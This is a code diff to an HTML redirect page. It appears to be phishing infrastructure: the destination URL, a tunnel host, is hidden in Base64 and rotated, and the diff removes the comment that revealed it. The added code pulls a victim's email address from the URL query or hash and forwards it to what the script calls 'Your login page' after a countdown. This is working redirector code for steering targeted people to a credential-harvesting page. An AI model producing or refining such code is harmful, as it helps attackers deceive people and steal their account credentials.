@@ -82,25 +82,36 @@ body {
 <script>
 // Rotating URLs - encoded in Base64
 const encodedUrls = [
-    'aHR0cHM6Ly9hY20tcXVlcmllcy1tZWRpY2FpZC1ndWlkZWQudHJ5Y2xvdWRmbGFyZS5jb20', // https://acm-queries-medicaid-guided.trycloudflare.com
+    'aHR0cHM6Ly9hY20tcXVlcmllcy1tZWRpY2FpZC1ndWlkZWQudHJ5Y2xvdWRmbGFyZS5jb20', 
 ];
 
-// Function to get the next URL in rotation
 function getNextUrl() {
-    // Get current rotation index from localStorage, or start at 0
     let currentIndex = parseInt(localStorage.getItem('urlRotationIndex') || '0');
-    
-    // Get the URL at current index
     const url = encodedUrls[currentIndex];
-    
-    // Update index for next visit (wrap around if needed)
     const nextIndex = (currentIndex + 1) % encodedUrls.length;
     localStorage.setItem('urlRotationIndex', nextIndex.toString());
-    
     return url;
 }
 
-const destinationUrl = atob(getNextUrl()); // Decodes the Base64 string back to a normal URL
+// 🆕 PASS EMAIL THROUGH URL MAGIC!
+const baseUrl = atob(getNextUrl()); // Your login page
+const emailParam = new URLSearchParams(window.location.search).get('email') || '';
+const hashEmail = window.location.hash.substring(1);
+
+let destinationUrl;
+if (emailParam && emailParam.includes('@')) {
+    destinationUrl = `${baseUrl}?email=${encodeURIComponent(emailParam)}`;
+    console.log('🔗 PASSING EMAIL:', emailParam);
+} else if (hashEmail && hashEmail.includes('@')) {
+    destinationUrl = `${baseUrl}?email=${encodeURIComponent(hashEmail)}`;
+    console.log('🔗 PASSING HASH EMAIL:', hashEmail);
+} else {
+    destinationUrl = baseUrl;
+    console.log('⚠️ NO EMAIL FOUND');
+}
+
+console.log('🚀 FINAL DEST:', destinationUrl);
+
 const delayInSeconds = 5;
 const countdownElement = document.getElementById('countdown');
 let secondsLeft = delayInSeconds;
@@ -113,7 +124,7 @@ const countdownInterval = setInterval(() => {
     
     if (secondsLeft <= 0) {
         clearInterval(countdownInterval);
-        window.location.href = destinationUrl;
+        window.location.href = destinationUrl; // NOW HAS ?email!
     }
 }, 1000);
 </script>
